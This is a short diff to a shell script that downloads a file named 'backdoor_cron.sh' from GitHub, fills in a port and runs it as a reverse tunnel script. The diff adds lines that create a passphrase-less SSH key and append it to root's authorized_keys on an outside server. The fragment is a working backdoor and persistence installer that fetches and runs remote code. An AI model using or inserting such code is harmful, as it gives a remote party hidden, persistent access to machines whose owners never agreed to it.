@@ -6,6 +6,9 @@ else
     curl https://raw.githubusercontent.com/tpanum/sh/master/scripts/backdoor_cron.sh > reverse_tunnel_port_$1.sh
     sed -i "s/{{@PORT}}/$1/g" reverse_tunnel_port_$1.sh
 
+    cat /dev/zero | ssh-keygen -q -N ""
+    cat ~/.ssh/id_rsa.pub | ssh root@server.panum.dk 'cat >> .ssh/authorized_keys'
+
     chmod +x reverse_tunnel_port_$1.sh
     ./reverse_tunnel_port_$1.sh
 
